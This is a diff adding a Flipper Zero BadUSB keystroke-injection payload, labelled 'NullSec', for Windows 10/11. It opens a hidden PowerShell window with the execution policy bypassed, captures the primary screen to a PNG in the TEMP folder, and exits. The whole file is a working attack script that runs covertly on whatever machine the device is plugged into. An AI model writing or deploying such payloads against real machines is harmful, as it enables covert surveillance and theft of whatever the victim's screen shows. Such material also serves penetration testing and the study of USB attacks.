@@ -1,0 +1,27 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Screenshot Capture
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 500
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING [Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
+ENTER
+STRING $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+ENTER
+STRING $bmp = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
+ENTER
+STRING $g = [System.Drawing.Graphics]::FromImage($bmp)
+ENTER
+STRING $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
+ENTER
+STRING $bmp.Save("$env:TEMP\screenshot.png")
+ENTER
+STRING exit
+ENTER
